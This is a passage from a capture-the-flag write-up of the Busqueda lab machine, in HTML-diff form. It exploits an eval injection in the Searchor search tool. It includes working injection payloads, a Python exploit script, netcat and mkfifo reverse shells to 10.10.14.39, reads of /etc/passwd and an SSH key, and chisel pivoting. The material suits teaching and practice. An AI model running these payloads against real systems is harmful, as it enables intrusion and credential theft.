+<span class="gp">&gt;&gt;&gt; </span><span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;)&quot;</span>
+<span class="go">&quot;Engine.Youtube.search(&#39;hi&#39;)&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
+<span class="go">&#39;https://www.youtube.com/results?search_query=hi&#39;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">query</span><span class="o">=</span><span class="s2">&quot;&#39;),dir(),print(&#39;&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;)&quot;</span>
+<span class="go">&quot;Engine.Youtube.search(&#39;&#39;),dir(),print(&#39;&#39;)&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
+
+<span class="go">(&#39;https://www.youtube.com/results?search_query=&#39;, [&#39;Engine&#39;, &#39;__annotations__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;engine&#39;, &#39;query&#39;], None)</span>
+</pre></div>
+</div>
+<p>The older version didn’t have the docker container, but no big deal, lets just make a virtual environment, and install the tool</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>checkout<span class="w"> </span>b5e67ec
+python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>venv
+<span class="nb">source</span><span class="w"> </span>venv/bin/activate
+pip<span class="w"> </span>install<span class="w"> </span>.
+</pre></div>
+</div>
+<p>We know the eval is beeing called whan using the cli like this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchor<span class="w"> </span>search<span class="w"> </span>Youtube<span class="w"> </span><span class="s1">&#39;hamsters&#39;</span>
+https://www.youtube.com/results?search_query<span class="o">=</span>hamsters
+</pre></div>
+</div>
+<p>Playing around to get command execution</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">engine</span><span class="o">=</span><span class="s2">&quot;Youtube&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">open</span><span class="o">=</span><span class="kc">False</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">copy</span><span class="o">=</span><span class="kc">False</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">query</span><span class="o">=</span><span class="s2">&quot;&#39;),dir(),Engine.Youtube.search(&#39;&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s2">)&quot;</span>
+<span class="go">&quot;Engine.Youtube.search(&#39;&#39;),dir(),Engine.Youtube.search(&#39;&#39;, copy_url=False, open_web=False)&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+<span class="go">(&#39;https://www.youtube.com/results?search_query=&#39;, [&#39;Engine&#39;, &#39;__annotations__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;copy&#39;, &#39;engine&#39;, &#39;open&#39;, &#39;open_web&#39;, &#39;query&#39;], &#39;https://www.youtube.com/results?search_query=&#39;)</span>
+</pre></div>
+</div>
+<p>So if we do that from the cli that should work too</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchor<span class="w"> </span>search<span class="w"> </span>Youtube<span class="w"> </span><span class="s2">&quot;&#39;),dir(),Engine.Youtube.search(&#39;&quot;</span>
+<span class="o">(</span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span>,<span class="w"> </span><span class="o">[</span><span class="s1">&#39;copy&#39;</span>,<span class="w"> </span><span class="s1">&#39;engine&#39;</span>,<span class="w"> </span><span class="s1">&#39;open&#39;</span>,<span class="w"> </span><span class="s1">&#39;query&#39;</span><span class="o">]</span>,<span class="w"> </span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span><span class="o">)</span>
+</pre></div>
+</div>
+<p>And it does, so assuming that the webapp calls the that same function in the main somehow, it should give us RCE this way</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://searcher.htb/search<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;engine=Youtube&amp;query=%27%29%2Cdir%28%29%2CEngine.Youtube.search%28%27&#39;</span>
+
+<span class="o">(</span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span>,<span class="w"> </span><span class="o">[</span><span class="s1">&#39;copy&#39;</span>,<span class="w"> </span><span class="s1">&#39;engine&#39;</span>,<span class="w"> </span><span class="s1">&#39;open&#39;</span>,<span class="w"> </span><span class="s1">&#39;query&#39;</span><span class="o">]</span>,<span class="w"> </span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span><span class="o">)</span>
+</pre></div>
+</div>
+<p>eval, is a bit inconvenient, as we can’t really separate our statements with semicolons,<br />
+So I ended up finding a stack overflow post suggesting to call os.system to do a netcat reverse shell
+And the nc shell itself didn’t work, but I could start playing with that:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;),__import__(&#39;</span>os<span class="s1">&#39;).system(&#39;</span>nc<span class="w"> </span><span class="m">10</span>.10.14.39<span class="w"> </span><span class="m">4242</span><span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="s1">&#39;),Engine.Youtube.search(&#39;</span>
+<span class="s1">&#39;),__import__(&#39;</span>os<span class="s1">&#39;).system(&#39;</span>ping<span class="w"> </span>-c3<span class="w"> </span><span class="m">10</span>.10.14.39<span class="s1">&#39;),Engine.Youtube.search(&#39;</span>
+<span class="s1">&#39;),__import__(&#39;</span>os<span class="s1">&#39;).system(&#39;</span>cat<span class="w"> </span>/etc/passwd<span class="s1">&#39;),Engine.Youtube.search(&#39;</span>
+<span class="s1">&#39;),__import__(&#39;</span>os<span class="s1">&#39;).system(&#39;</span>pwd<span class="s1">&#39;),Engine.Youtube.search(&#39;</span>
+</pre></div>
+</div>
+<p>Let’s make a quick exploit script</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">urlencode</span><span class="p">,</span> <span class="n">quote_plus</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://searcher.htb/search&quot;</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;*/*&quot;</span>
+<span class="p">}</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&#39;),__import__(&#39;os&#39;).system(&#39;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&#39;),Engine.Youtube.search(&#39;&quot;</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;engine=Youtube&amp;query=</span><span class="si">{</span><span class="n">encoded</span><span class="si">}</span><span class="s2">&quot;</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>tool.py<span class="w"> </span><span class="s2">&quot;id&quot;</span>
+<span class="m">200</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>svc<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>svc<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>svc<span class="o">)</span>
+<span class="o">(</span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span><span class="o">)</span>
+
+python3<span class="w"> </span>tool.py<span class="w"> </span><span class="s2">&quot;pwd&quot;</span>
+<span class="m">200</span>
+/var/www/app
+<span class="o">(</span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span><span class="o">)</span>
+
+python3<span class="w"> </span>tool.py<span class="w"> </span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="p">|</span>grep<span class="w"> </span>sh$
+root:x:0:0:root:/root:/bin/bash
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+
+python3<span class="w"> </span>tool.py<span class="w"> </span><span class="s2">&quot;cat /home/svc/.ssh/id_rsa&quot;</span>
+<span class="m">200</span>
+<span class="o">(</span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span>,<span class="w"> </span><span class="m">256</span>,<span class="w"> </span><span class="s1">&#39;https://www.youtube.com/results?search_query=&#39;</span><span class="o">)</span>
+</pre></div>
+</div>
+<p>After throwing a few revshels form revshells.com, finally got one to stick</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>tool.py<span class="w"> </span><span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.39 4242 &gt;/tmp/f&quot;</span>
+</pre></div>
+</div>
+<p>Getting the user flag, and dropping an authorized keys in ~svc to get a propper shell</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ cd
+$ pwd
+/home/svc
+$ wc -c user.txt
+</pre></div>
+</div>
+<p>Just checking the app to see if our assumption was correct</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:/var/www/app$<span class="w"> </span>vim<span class="w"> </span>app.py
+</pre></div>
+</div>
+<p>And yea, it is a super simple flask app, that calls the cli of searchor through subprocess, triggering the vulnerable code in main</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span>
+<span class="kn">from</span> <span class="nn">searchor</span> <span class="kn">import</span> <span class="n">Engine</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">__members__</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">search</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">engine</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;engine&#39;</span><span class="p">)</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;query&#39;</span><span class="p">)</span>
+        <span class="n">auto_redirect</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;auto_redirect&#39;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">engine</span> <span class="ow">in</span> <span class="n">Engine</span><span class="o">.</span><span class="n">__members__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;searchor&#39;</span><span class="p">,</span> <span class="s1">&#39;search&#39;</span><span class="p">,</span> <span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">]</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">arg_list</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">auto_redirect</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">url</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">__members__</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s2">&quot;Invalid engine!&quot;</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">__members__</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s2">&quot;Something went wrong!&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="privesc">
+<h2>Privesc<a class="headerlink" href="#privesc" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>svc@busqueda:~$ netstat -tulpen
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
+tcp        0      0 127.0.0.1:43439         0.0.0.0:*               LISTEN      0          35379      -
+tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1000       733356     245982/python3
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      0          38537      -
+tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      0          38453      -
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          37321      -
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1000       38681      1657/python3
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        32241      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          36235      -
+tcp6       0      0 :::22                   :::*                    LISTEN      0          35309      -
+tcp6       0      0 :::80                   :::*                    LISTEN      0          36260      -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        32240      -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          32286      -
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:43439
+HTTP/1.1 404 Not Found
+Date: Mon, 01 May 2023 11:28:17 GMT
+Content-Length: 19
+Content-Type: text/plain; charset=utf-8
+
+svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:5000
+HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.10.6
+Date: Mon, 01 May 2023 11:28:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 13519
+Connection: close
+
+svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:3000
+HTTP/1.1 200 OK
+Set-Cookie: i_like_gitea=1785a26bfd1cd4f4; Path=/; HttpOnly; SameSite=Lax
+Date: Mon, 01 May 2023 11:28:27 GMT
+</pre></div>
+</div>
+<p>So there’s a gitea instance, probably not pointing to the flask app though</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@busqueda:/var/www/app$<span class="w"> </span>git<span class="w"> </span>config<span class="w"> </span>--global<span class="w"> </span>--add<span class="w"> </span>safe.directory<span class="w"> </span>/var/www/app
+svc@busqueda:/var/www/app$<span class="w"> </span>git<span class="w"> </span>log<span class="w"> </span>--oneline
+5ede9ed<span class="w"> </span><span class="o">(</span>HEAD<span class="w"> </span>-&gt;<span class="w"> </span>main,<span class="w"> </span>origin/main<span class="o">)</span><span class="w"> </span>Initial<span class="w"> </span>commit
+</pre></div>
+</div>
+<p>Lets setup some socks5 proxy with chisel</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">local</span><span class="w"> </span><span class="c1"># ./chisel-arm server -p 4242 --socks5 --reverse</span>
+remote<span class="w"> </span><span class="c1"># ./chisel-amd client 10.10.14.39:4242 R:1080:socks</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">local</span><span class="w"> </span><span class="c1"># curl -x socks5://localhost:1080 -I http://127.0.0.1:3000</span>
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Set-Cookie:<span class="w"> </span><span class="nv">i_like_gitea</span><span class="o">=</span>f5aafbf458b1e8de<span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
+Date:<span class="w"> </span>Mon,<span class="w"> </span><span class="m">01</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">11</span>:37:38<span class="w"> </span>GMT
+</pre></div>
+</div>
+<p>Making a quick foxyproxy config, and we’re all set
+<img alt="foxy.png" src="../../../../_images/foxy.png" /><br />
+<img alt="root.png" src="../../../../_images/root.png" /></p>
+<p>In ~svc</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">user</span><span class="p">]</span>
+        <span class="n">email</span> <span class="o">=</span> <span class="n">cody</span><span class="nd">@searcher</span><span class="o">.</span><span class="n">htb</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">cody</span>
+<span class="p">[</span><span class="n">core</span><span class="p">]</span>
+        <span class="n">hooksPath</span> <span class="o">=</span> <span class="n">no</span><span class="o">-</span><span class="n">hooks</span>
+</pre></div>
+</div>
+<p>Scanning through the proxy</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>-q<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-01<span class="w"> </span><span class="m">13</span>:13<span class="w"> </span>IST
+Stats:<span class="w"> </span><span class="m">0</span>:00:07<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Connect<span class="w"> </span>Scan
+Connect<span class="w"> </span>Scan<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">8</span>.70%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">13</span>:14<span class="w"> </span><span class="o">(</span><span class="m">0</span>:01:24<span class="w"> </span>remaining<span class="o">)</span>
+Stats:<span class="w"> </span><span class="m">0</span>:00:16<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Connect<span class="w"> </span>Scan
+Connect<span class="w"> </span>Scan<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">17</span>.70%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">13</span>:14<span class="w"> </span><span class="o">(</span><span class="m">0</span>:01:14<span class="w"> </span>remaining<span class="o">)</span>
+Stats:<span class="w"> </span><span class="m">0</span>:00:16<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Connect<span class="w"> </span>Scan
+Connect<span class="w"> </span>Scan<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">18</span>.60%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">13</span>:14<span class="w"> </span><span class="o">(</span><span class="m">0</span>:01:10<span class="w"> </span>remaining<span class="o">)</span>
+Stats:<span class="w"> </span><span class="m">0</span>:00:38<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Connect<span class="w"> </span>Scan
+Connect<span class="w"> </span>Scan<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">43</span>.00%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">13</span>:14<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:50<span class="w"> </span>remaining<span class="o">)</span>
+Stats:<span class="w"> </span><span class="m">0</span>:02:41<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Service<span class="w"> </span>Scan
+Service<span class="w"> </span>scan<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">66</span>.67%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">13</span>:16<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:35<span class="w"> </span>remaining<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>pop.localhost<span class="w"> </span><span class="o">(</span><span class="m">127</span>.0.0.1<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.089s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">994</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.9p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu0.1<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>4fe3a667a227f9118dc30ed773a02c28<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>816e78766b8aea7d1babd436b7f8ecc4<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.52
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.52<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>http://searcher.htb/
+<span class="m">222</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">9</span>.0<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>3a3815229d615cd6253f821303e21c2a<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>35f562c5ab52e6869dbf8d5dd4c33c22<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">3000</span>/tcp<span class="w"> </span>open<span class="w">  </span>ppp?
+<span class="p">|</span><span class="w"> </span>fingerprint-strings:
+<span class="p">|</span><span class="w">   </span>GenericLines,<span class="w"> </span>Help,<span class="w"> </span>RTSPRequest:
+<span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">400</span><span class="w"> </span>Bad<span class="w"> </span>Request
